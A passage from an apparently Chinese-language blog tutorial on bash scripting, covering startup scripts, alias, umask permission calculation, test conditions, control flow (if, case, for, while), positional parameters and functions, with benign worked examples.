<p>为了方便使登录Shell 也能自动执行<code>/.bashrc</code>，通常在<code>/.bash_profile</code>中调用<code>/.bashrc</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line">	. ~/.bashrc</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>这几行的意思是，如果<code>/.bashrc</code>文件存在则<code>source</code>它。多数Linux发行版在创建账户时会自动创建<code>/.bash_profile</code>和<code>/.bashrc</code>脚本，<code>/.bash_profile</code>中通常都有上面几行。所以，如果要在启动脚本中做某些设置，使它在图形终端窗口和字符终端的Shell中都起作用，最好就是在<code>/.bashrc</code>中设置。</p>
<p>为什么登录Shell 和非登录Shell 的启动脚本要区分开呢？最初的设计是这样考虑的，如果从字符终端或者远程登录，那么登录Shell 是该用户的所有其它进程的父进程，也是其它子Shell 的父进程，所以环境变量在登录Shell 的启动脚本里设置一次就可以自动带到其它非登录Shell 里，而 Shell 的本地变量、函数、<code>alias</code>等设置没有办法带到 子Shell 里，需要每次启动非登录Shell 时设置一遍，所以就需要有非登录Shell 的启动脚本，所以一般来说在<code>~/.bash_profile</code>里设置环境变量，在<code>~/.bashrc</code>里设置本地变量、函数、<code>alias</code>等。如果你的Linux带有图形系统则不能这样设置，由于从图形界面的窗口管理器登录并不会产生登录Shell，所以环境变量也应该在<code>~/.bashrc</code>里设置。</p>
<h3 id="4-3-非交互启动"><a href="#4-3-非交互启动" class="headerlink" title="4.3 非交互启动"></a>4.3 非交互启动</h3><p>为执行脚本而<code>fork</code>出来的子Shell 是非交互式Shell，启动时执行的脚本文件由环境变量<code>BASH_ENV</code>定义，相当于自动执行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ -n &quot;$BASH_ENV&quot; ]; then . &quot;$BASH_ENV&quot;; fi</span><br></pre></td></tr></table></figure>

<p>如果环境变量<code>BASH_ENV</code>不是空字符串，则把它的值当作启动脚本的文件名，<code>source</code>这个脚本。</p>
<p>需要注意的是，在非交互式Shell中，启动脚本的执行仅限于<code>BASH_ENV</code>变量指定的脚本文件。如果没有设置<code>BASH_ENV</code>变量，或者指定的脚本文件不存在或无法访问，Shell将不会执行任何启动脚本或配置文件。</p>
<h3 id="4-4-以-sh-命令启动"><a href="#4-4-以-sh-命令启动" class="headerlink" title="4.4 以 sh 命令启动"></a>4.4 以 sh 命令启动</h3><p>如果以<code>sh</code>命令启动<code>bash</code>，<code>bash</code>将模拟<code>sh</code>的行为，以<code>/.bash_</code>开头的那些启动脚本就不认了。所以，如果作为交互登录Shell启动，或者通过<code>--login</code>参数启动，则依次执行以下脚本：</p>
<ol>
<li><code>/etc/profile</code></li>
<li><code>/.profile</code></li>
</ol>
<p>如果作为交互Shell启动，相当于自动执行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ -n &quot;$ENV&quot; ]; then . &quot;$ENV&quot;; fi</span><br></pre></td></tr></table></figure>

<p>如果作为交互式Shell启动，则不需要执行任何启动脚本。通常我们写的Shell脚本都以<code>#! /bin/sh</code>开头，都属于这种方式。</p>
<p><a name="alias">[3]</a>: <code>alias</code>是用来给命令设置别名的。通过<code>alias</code>我们可以将一个命令用一个简短的别名来代替。举个例子：我们可以将<code>ls -l</code>命令设置成<code>ll</code>，这样每次输入<code>ll</code>就相当于执行了命令<code>ls -l</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -l&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">ll</span></span><br><span class="line">总用量 0</span><br><span class="line">-rw-rw-r-- 1 guoxb guoxb 0 Apr 19 19:04 &#x27;$ $&#x27;</span><br><span class="line">-rw-rw-r-- 1 guoxb guoxb 0 Apr 19 19:04  file1.txt</span><br><span class="line">-rw-rw-r-- 1 guoxb guoxb 0 Apr 19 19:04  file2.txt</span><br><span class="line">-rw-rw-r-- 1 guoxb guoxb 0 Apr 19 19:04  file3.log</span><br></pre></td></tr></table></figure>

<p><a name="umask">[4]</a>: <code>umask</code>在Linux或Unix操作系统中，是一个用于限定默认权限的特殊权限掩码。当新建一个文件或者目录时，系统会根据 <strong>umask</strong> 的值来限制文件或目录的默认权限（即通过 <strong>umask</strong> 值来计算初始权限）。<strong>umask</strong> 的值是一个四位八进制数，表示需要屏蔽掉的权限位，其中第 1 个数代表的是文件所具有的特殊权限（SetUID、SetGID、Sticky BIT）。二进制形式的 <strong>umask</strong> 值的每一位代表一种权限，1 表示该权限被屏蔽，0 表示该权限不被屏蔽。可以通过系统的<code>umask</code>命令来查看当前用户的 <strong>umask</strong> 值（root用户默认为 0022 ，普通用户默认为0002）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(whoami)</span> 的umask值是 <span class="subst">$(umask)</span>&quot;</span></span></span><br><span class="line">guoxb 的umask值是 0002</span><br></pre></td></tr></table></figure>

<p>在Linux系统中，文件和目录的最大默认权限是不一样的：</p>
<ul>
<li><strong>文件</strong>：可拥有的最大默认权限是 666 ，即<code>rw-rw-rw-</code>，<code>x</code>是文件的最大权限，新建文件的时候是不会赋予的，只能通过用户手工赋予。</li>
<li><strong>目录</strong>：可拥有的最大默认权限是 777 ，即<code>rwxrwxrwx</code>。</li>
</ul>
<p>需要注意，这的最大默认权限 ≠ 新建文件时的初始权限。文件和目录的初始权限是计算得出的，具体计算方法如下：</p>
<p>文件（目录）的初始权限 &#x3D; 文件（目录）的最大默认权限 <strong>(bitwise)AND</strong> umask值</p>
<p>举个栗子：</p>
<ul>
<li><p><strong>文件：</strong>假如 <strong>umask</strong> 值为 0022，要创建一个新文件，其默认权限是 666（即owner、group和others都有读、写权限）。那么计算新文件的实际权限的过程如下：</p>
<ol>
<li>将 <strong>umask</strong> 值转换为二进制：0022 &#x3D; 000 010 010</li>
<li>将默认权限转换为二进制：    666 &#x3D; 110 110 110</li>
<li>将 <strong>umask</strong> 值与默认权限进行按位与操作，得到实际权限 644 &#x3D; 110 100 100 。即owner拥有读写权限，group和others只有读权限。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  0022: 000 010 010</span><br><span class="line">&amp;  666: 110 110 110</span><br><span class="line">--------------------</span><br><span class="line">        110 100 100 = 644</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~/gxb# umask; touch newfile; ll newfile</span><br><span class="line">0022</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 19 19:52 newfile</span><br></pre></td></tr></table></figure>

<p><strong>目录：</strong>同文件，假如 <strong>umask</strong> 值为 0022，要创建一个新目录，其默认权限是 777（即owner、group和others都有读、写、执行权限）。那么计算新目录的实际权限的过程如下：</p>
<ol>
<li>将 <strong>umask</strong> 值转换为二进制：0022 &#x3D; 000 010 010</li>
<li>将默认权限转换为二进制：    777 &#x3D; 111 111 111</li>
<li>将 <strong>umask</strong> 值与默认权限进行按位与操作，得到实际权限：755 &#x3D; 111 101 101 。即owner拥有读写执行权限，group和others只有读和执行权限。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  0022: 000 010 010</span><br><span class="line">&amp;  777: 111 111 111</span><br><span class="line">--------------------</span><br><span class="line">        111 101 101 = 755</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~/gxb# umask; mkdir newdir; ll | grep newdir</span><br><span class="line">0022</span><br><span class="line">drwxr-xr-x  2 root  root  4096 Apr 19 19:53 newdir/</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="5-Shell-脚本语法"><a href="#5-Shell-脚本语法" class="headerlink" title="5. Shell 脚本语法"></a>5. Shell 脚本语法</h2><h3 id="5-1-条件测试：test"><a href="#5-1-条件测试：test" class="headerlink" title="5.1 条件测试：test | ["></a>5.1 条件测试：test | [</h3><p>命令<code>test</code>或<code>[</code>可以测试一个条件是否成立，如果测试结果为真，则该命令的 Exit Status 为0，如果测试结果为假，则命令 Exit Status为1（注意与C语言的逻辑表示正好相反）。例如测试两个数的大小关系：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">VAR=2</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">test</span> <span class="variable">$VAR</span> -gt 1</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> $?</span></span><br><span class="line">0</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">test</span> <span class="variable">$VAR</span> -gt 3</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> $?</span></span><br><span class="line">1</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">[ <span class="variable">$VAR</span> -gt 3 ]</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> $?</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>这里需要注意，<code>[]</code>内首位处记得加空格，不然会出错，就像下边这样：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">[<span class="variable">$VAR</span> -gt 3]</span></span><br><span class="line">[2：未找到命令</span><br></pre></td></tr></table></figure>

<p>原因就是因为，左方括号<code>[</code>其实是一个命令（虽然这看起来很奇怪），传给命令的个参数之间应该用空格隔开。比如上边的命令<code>[ $VAR -gt 3 ]</code>中，<code>[</code>是命令，而<code>$VAR</code>、<code>-gt</code>、<code>3</code>、<code>]</code>则是<code>[</code>命令的四个参数，他们之间必须用空格隔开。</p>
<p>命令<code>test</code>和<code>[</code>的参数形式是相同的，只不过<code>test</code>命令不需要<code>]</code>参数。以<code>[</code>为例，常见的测试命令如下表所示：</p>
<table>
<thead>
<tr>
<th>测试命令</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>[ -d DIR ]</code></td>
<td>如果DIR存在并且是一个目录则为真</td>
</tr>
<tr>
<td><code>[ -f FILE ]</code></td>
<td>如果FILE存在并且是一个文件则为真</td>
</tr>
<tr>
<td><code>[ -z STRING ]</code></td>
<td>如果STRING的长度为零则为真</td>
</tr>
<tr>
<td><code>[ -n STRING ]</code></td>
<td>如果STRING的长度非零则为真</td>
</tr>
<tr>
<td><code>[ STRING1 = STRING2 ]</code></td>
<td>如果两个字符串相同则为真</td>
</tr>
<tr>
<td><code>[ STRING1 != STRING2 ]</code></td>
<td>如果两个字符串不相同则为真</td>
</tr>
<tr>
<td><code>[ ARG1 OP ARG2 ]</code></td>
<td>ARG1和ARG2应该是整数或者取值为整数的变量，OP是<code>-eq</code>(等于)、<code>-ne</code>(不等于)、<code>lt</code>(小于)、<code>le</code>(小于等于)、<code>gt</code>(大于)、<code>ge</code>(大于等于) 之中的一个</td>
</tr>
</tbody></table>
<p>和C语言相似，测试条件之间还可以做与、或、非逻辑运算：</p>
<table>
<thead>
<tr>
<th>测试命令</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>[ ! EXPR ]</code></td>
<td>EXPR即expression（表达式），可以是上表中的任意一种测试条件，！表示逻辑反</td>
</tr>
<tr>
<td><code>[ EXPR1 -a EXPR2 ]</code></td>
<td>EXPR1和EXPR2可以是上表中的任意一种测试条件，-a 表示逻辑与</td>
</tr>
<tr>
<td><code>[ EXPR1 -o EXPR2 ]</code></td>
<td>EXPR1和EXPR2可以是上表种的任意一种测试条件，-o 表示逻辑或</td>
</tr>
</tbody></table>
<p>举个例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">VAR=abc</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">[ -d Desktop -a <span class="variable">$VAR</span> = <span class="string">&#x27;abc&#x27;</span> ]</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> $?</span></span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>这里EXPR指的测试条件是 <code>-d Desktop</code>这种不带方括号的，因为这里的左方括号<code>[</code>是命令，右方括号<code>]</code>是参数，所以不能进行简单的嵌套，比如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">[ -d Desktop -a [ <span class="variable">$VAR</span> = <span class="string">&#x27;abc&#x27;</span> ] ]</span></span><br><span class="line">-bash: [: 参数太多</span><br></pre></td></tr></table></figure>

<p>这样的错误用法原因就是，错误的把<code>[]</code>当作一个整体，类似于<code>()</code>，而没有理解<code>[</code>和<code>]</code>其实是分开的命令和参数。</p>
<p><strong>此外还需注意：</strong>如果上例中的<code>$VAR</code>变量没有事先定义，则会被Shell展开为空字符串，会造成测试条件的语法错误（展开后为<code>[ -d Desktop -a = &#39;abc&#39; ]</code>），作为一种好的Shell编程习惯，应该总是把变量取值放在双引号之中（展开后为<code>[ -d Desktop -a &quot;&quot; = &#39;abc&#39; ]</code>）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">unset</span> VAR</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">[ -d Desktop -a <span class="variable">$VAR</span> = <span class="string">&#x27;abc&#x27;</span> ]</span></span><br><span class="line">bash: [: 参数太多</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">[ -d Desktop -a <span class="string">&quot;<span class="variable">$VAR</span>&quot;</span> = <span class="string">&#x27;abc&#x27;</span> ]</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> $?</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>



<h3 id="5-2-if-then-elif-else-fi"><a href="#5-2-if-then-elif-else-fi" class="headerlink" title="5.2 if&#x2F;then&#x2F;elif&#x2F;else&#x2F;fi"></a>5.2 if&#x2F;then&#x2F;elif&#x2F;else&#x2F;fi</h3><p>和C语言类似，在Shell中使用<code>if</code>、<code>then</code>、<code>elif</code>、<code>else</code>、<code>fi</code>这几条命令实现分支控制。这种流程控制语句本质上也是由若干条 Shell命令组成的，例如先前讲过的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line">	. ~/.bashrc</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>这其实是三条命令，<code>if [ -f ~/.bashrc ]</code>是第一条，<code>then . ~/.bashrc</code>是第二条，<code>fi</code>是第三条。如果两条命令写在同一行则需要用<code>;</code>隔开，一行只写一条命令就不需要写<code>;</code>号了，另外，<code>then</code>后边有换行，但这条命令没写完，Shell会自动续行，把下一行接在<code>then</code>后面当作一条命令处理。和<code>[</code>命令一样，要注意命令和各参数之间必须用空格隔开。<code>if</code>命令的参数组成一条子命令，如果该子命令的 Exit Status 为 0 （表示真），则执行<code>then</code>后面的子命令，如果 Exit Status 非 0 （表示假），则执行<code>elif</code>、<code>else</code>或者<code>fi</code>后面的子命令。<code>if</code>后面的子命令通常是测试命令，但也可以是其他命令。Shell脚本没有<code>&#123;&#125;</code>括号，所以用<code>fi</code>表示<code>if</code>语句块的结束。比如下面的例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">if [ -f /bin/bash ]</span><br><span class="line">then echo &quot;/bin/bash is a file&quot;</span><br><span class="line">else echo &quot;/bin/bash is NOT a file&quot;</span><br><span class="line">fi</span><br><span class="line">if :; then echo &quot;always true&quot;; fi</span><br></pre></td></tr></table></figure>

<p>最后一行中的<code>:</code>是一个特殊的命令，称为空命令，该命令不做任何事，但 Exit Status 总是真。此外，也可以执行<code>/bin/true</code>或<code>/bin/false</code>得到真或假的 Exit Status。</p>
<p>再来看一个例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">echo &quot;Is it morning? Please answer yes or no.&quot;</span><br><span class="line">read YES_OR_NO</span><br><span class="line">if [ &quot;$YES_OR_NO&quot; = &quot;yes&quot; ]; then</span><br><span class="line">	echo &quot;Good morning!&quot;</span><br><span class="line">elif [ &quot;$YES_OR_NO&quot; = &quot;no&quot; ]; then</span><br><span class="line">	echo &quot;Good afternon!&quot;</span><br><span class="line">else</span><br><span class="line">	echo &quot;Sorry, $YES_OR_NO not recognized. Enter yes or no.&quot;</span><br><span class="line">	exit 1</span><br><span class="line">fi</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<p>上面的例子中，<code>read</code>命令的作用就是等待用户输入一行字符串，将该字符串存在一个Shell变量中。</p>
<p>此外，Shell 还提供了<code>&amp;&amp;</code>和<code>||</code>语法，和C语言类似，具有 Short-circuit特性，很多脚本喜欢写成这样：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test &quot;$(whoami)&quot; != &#x27;root&#x27; &amp;&amp; (echo you are using a non-privileged account; exit 1)</span><br></pre></td></tr></table></figure>

<p>这条Shell命令由两个命令组成，分别是<strong>测试命令</strong><code>test &quot;$(whoami)&quot; != &#39;root&#39;</code>和<strong>一个包含两个命令的命令组</strong><code>(echo you using a non-privileged account; exit 1)</code>。这条命令的作用是：检查当前用户是否为 root 用户，如果不是，则输出一条提示信息，并退出脚本。</p>
<p><code>&amp;&amp;</code>相当于<code>if ... then ...</code>，而<code>||</code>相当于<code>if not ... then ...</code>。<code>&amp;&amp;</code>和<code>||</code>用于连接两个命令，而上面讲的<code>-a</code>和<code>-o</code>仅用于测试表达式中连接两个测试条件，要注意他们的区别，例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test &quot;$VAR&quot; -gt 1 -a &quot;$VAR&quot; -lt 3</span><br></pre></td></tr></table></figure>

<p>和以下写法是等价的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test &quot;$VAR&quot; -gt 1 &amp;&amp; test &quot;$VAR&quot; -lt 3</span><br></pre></td></tr></table></figure>



<h3 id="5-3-case-esac"><a href="#5-3-case-esac" class="headerlink" title="5.3 case&#x2F;esac"></a>5.3 case&#x2F;esac</h3><p><code>case</code>命令可类比C语言的<code>switch/case</code>语句，<code>esac</code>表示<code>case</code>语句块的结束。C语言的<code>case</code>只能匹配整形和字符型常量表达式，而Shell脚本的<code>case</code>可以匹配字符串和 Wildcard（通配符）<a href="#Wildcard">[5]</a>，每个匹配分支可以有若干条命令，末尾必须以<code>;;</code>结束，执行时找到第一个匹配的分支并执行相应的命令，然后直接跳到<code>esac</code>之后，不需要像C语言一样用<code>break</code>跳出。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">echo &quot;Is it  morning? Please answer yes or no.&quot;</span><br><span class="line">read YES_OR_NO</span><br><span class="line">case &quot;$YES_OR_NO&quot; in</span><br><span class="line">	yes|y|Yes|YES)</span><br><span class="line">		echo &quot;Good Morning!&quot;;;</span><br><span class="line">	[nN]*)</span><br><span class="line">		echo &quot;Good afternon!&quot;;;</span><br><span class="line">	*)</span><br><span class="line">		echo &quot;Sorry, $YES_OR_NO not recognized. Enter yes or no.&quot;</span><br><span class="line">		exit 1;;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<p>使用<code>case</code>语句的例子可以在系统服务的脚本目录<code>/etc/init.d</code>中找到。这个目录下的脚本大多具有这种形式（以<code>/etc/apache2</code>）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case $1 in</span><br><span class="line">	start)</span><br><span class="line">		...</span><br><span class="line">	;;</span><br><span class="line">	stop)</span><br><span class="line">		...</span><br><span class="line">	;;</span><br><span class="line">	reload | force-reload)</span><br><span class="line">		...</span><br><span class="line">	;;</span><br><span class="line">	restart)</span><br><span class="line">	...</span><br><span class="line">	*)</span><br><span class="line">		log_success_msg &quot;Usage: /etc/init.d/apache2 &#123;start|stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean&#125;&quot;</span><br><span class="line">		exit 1</span><br><span class="line">	;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<p>启动 apache2 服务的命令是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">sudo /etc/init.d/apache2 start</span></span><br></pre></td></tr></table></figure>

<p>其中，<code>$1</code>是一个特殊变量，在执行脚本时自动取值为第一个命令行参数，也就是 <strong>start</strong> ，所以进入<code>start)</code>分支执行相关的命令。同理，命令行参数指定为<code>stop</code>、<code>reload</code>或<code>restart</code>可以进入其他分支执行停止服务、重新加载配置文件或重新启动服务的相关命令。</p>
<h3 id="5-4-for-do-done"><a href="#5-4-for-do-done" class="headerlink" title="5.4 for&#x2F;do&#x2F;done"></a>5.4 for&#x2F;do&#x2F;done</h3><p>Shell 脚本的<code>for</code>循环结构和C语言很不一样，它类似于某些编程语言的<code>foreach</code>循环。其实如果学过python，会比较好理解，跟python中的for循环比较相似。</p>
<p>举个例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">for FRUIT in apple banan pear; do</span><br><span class="line">	echo &quot;I like $FRUIT&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p><code>FRUIT</code>是一个循环变量，第一次循环<code>$FRUIT</code>的取值是<code>apple</code>，第二次取值是<code>banana</code>，第三次取值是<code>pear</code>。再比如，要将当前目录下的<code>chap0</code>、<code>chap1</code>、<code>chap2</code>等文件名改为<code>chap0~</code>、<code>chap1~</code>、<code>chap2~</code>等（按照惯例，末尾有<code>~</code>字符的文件名表示临时文件），这个命令可以这样写：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="keyword">for</span> FILENAME <span class="keyword">in</span> chap?; <span class="keyword">do</span> <span class="built_in">mv</span> <span class="variable">$FILENAME</span> <span class="variable">$FILENAME</span>~; <span class="keyword">done</span></span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>这里的<code>chap?</code>是匹配当前目录文件下的文件，如果前边加上了路径，比如下面的例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">tree .</span></span><br><span class="line">.</span><br><span class="line">├── file1.txt</span><br><span class="line">├── file2.txt</span><br><span class="line">└── file3.log</span><br><span class="line"></span><br><span class="line">0 directories, 3 files</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="keyword">for</span> FILENAME <span class="keyword">in</span> ./file?.txt; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$FILENAME</span> ; <span class="keyword">done</span></span></span><br><span class="line">./file1.txt</span><br><span class="line">./file2.txt</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$FILENAME</span></span></span><br><span class="line">./file2.txt</span><br></pre></td></tr></table></figure>

<p>如果加上了路径的话，比如<code>./</code>，那<code>FILENAME</code>变量的值内就会包含路径，从输出我们可以看到，这里执行完这条命令后，<code>$FILENAME</code>的值为<code>./file2.txt</code>。</p>
<h3 id="5-5-while-do-done"><a href="#5-5-while-do-done" class="headerlink" title="5.5 while&#x2F;do&#x2F;done"></a>5.5 while&#x2F;do&#x2F;done</h3><p><code>while</code>的用法和C语言类似。比如下面这个例子，这是脚本的功能是验证密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">echo &quot;Enter password: &quot;</span><br><span class="line">read TRY</span><br><span class="line">while [ &quot;$TRY&quot; != &quot;secret&quot; ]; do</span><br><span class="line">	echo &quot;Sorry, Try again&quot;</span><br><span class="line">	read TRY</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>下面的例子通过算术运算控制循环的次数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">COUNTER=1</span><br><span class="line">while [ &quot;$COUNTER&quot; -lt 10 ]; do</span><br><span class="line">	echo &quot;Here we go again&quot;</span><br><span class="line">	COUNTER=$(($COUNTER+1))</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>​	Shell还有<code>until</code>循环，类似C语言的<code>do...while</code>循环。</p>
<h3 id="5-6-位置参数和特殊变量"><a href="#5-6-位置参数和特殊变量" class="headerlink" title="5.6 位置参数和特殊变量"></a>5.6 位置参数和特殊变量</h3><p>有很多特殊变量是被Shell自动赋值的，我们已经遇到了<code>$?</code>和<code>$1</code>，现在总结一下常见的位置参数和特殊变量：</p>
<table>
<thead>
<tr>
<th>位置参数和特殊变量</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>相当于C语言<code>main</code>的<code>argv[0]</code></td>
</tr>
<tr>
<td><code>$1</code>、<code>$2</code>…</td>
<td>这些称为位置参数（Positional Parameter），相当于C语言<code>main</code>函数的<code>argv[1]</code>、<code>argv[2]</code>…</td>
</tr>
<tr>
<td><code>$#</code></td>
<td>相当于C语言<code>main</code>函数的<code>argc - 1</code>，即传递给脚本的参数个数，注意这里的#后边不表示注释</td>
</tr>
<tr>
<td><code>$@</code></td>
<td>表示参数列表<code>$1</code>、<code>$2</code>…，例如可以用在<code>for</code>循环中的<code>in</code>后面。</td>
</tr>
<tr>
<td><code>$?</code></td>
<td>上一条命令的 Exit Status</td>
</tr>
<tr>
<td><code>$$</code></td>
<td>当前Shell的进程号</td>
</tr>
</tbody></table>
<p>位置参数可以用<code>shift</code>命令左移。比如<code>shift 3</code>表示原来的<code>$4</code>现在变成<code>$1</code>，原来的<code>$5</code>现在变成<code>$2</code>等等，原来的<code>$1</code>、<code>$2</code>、<code>$3</code>丢弃，<code>$0</code>不移动。不带参数的<code>shift</code>命令相当于<code>shift 1</code>。例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">echo &quot;The program $0 is now running&quot;</span><br><span class="line">echo &quot;The first parameter is $1&quot;</span><br><span class="line">echo &quot;The second parameter is $2&quot;</span><br><span class="line">echo &quot;The parameter list is $@&quot;</span><br><span class="line">shift</span><br><span class="line">echo &quot;The first parameter is $1&quot;</span><br><span class="line">echo &quot;The second parameter is $2&quot;</span><br><span class="line">echo &quot;The parameter list is $@&quot;</span><br></pre></td></tr></table></figure>

<p>下面的例子演示了如何使用 <code>shift</code> 命令结合 <code>$#</code> 变量来处理命令行参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">process_args.sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出传递给脚本的参数个数</span></span><br><span class="line">echo &quot;Number of arguments: $#&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">依次处理每个参数</span></span><br><span class="line">while [ &quot;$#&quot; -gt 0 ]</span><br><span class="line">do</span><br><span class="line">    echo &quot;Processing argument: $1&quot;</span><br><span class="line">    shift</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">./process_args.sh arg1 arg2 arg3</span></span><br><span class="line">Number of arguments: 3</span><br><span class="line">Processing argument: arg1</span><br><span class="line">Processing argument: arg2</span><br><span class="line">Processing argument: arg3</span><br></pre></td></tr></table></figure>



<h3 id="5-7-函数"><a href="#5-7-函数" class="headerlink" title="5.7 函数"></a>5.7 函数</h3><p>和C语言类似，Shell中也有函数的概念，但是函数定义中没有返回值也没有参数列表。例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">foo()&#123; echo &quot;Function foo is called &quot;; &#125;</span><br><span class="line">echo &quot;-=start=-&quot;</span><br><span class="line">foo</span><br><span class="line">echo &quot;-=end=-&quot;</span><br></pre></td></tr></table></figure>

<p>注意，函数体的左花括号<code>&#123;</code>和后面的命令之间必须有空格或换行，如果将最后一条命令和右花括号<code>&#125;</code>写在同一行，命令末尾必须有<code>;</code>号。</p>
<p>在定义<code>foo()</code>函数时并不执行函数体中的命令，就像定义变量一样，只是给<code>foo</code>这个名字一个定义，到后面调用<code>foo</code>函数的时候（注意Shell中的函数调用不写括号）才执行函数体中的命令。Shell脚本中的函数必须先定义后调用，一般把函数的定义写在脚本的前面，把函数调用和其他命令写在脚本的最后。</p>
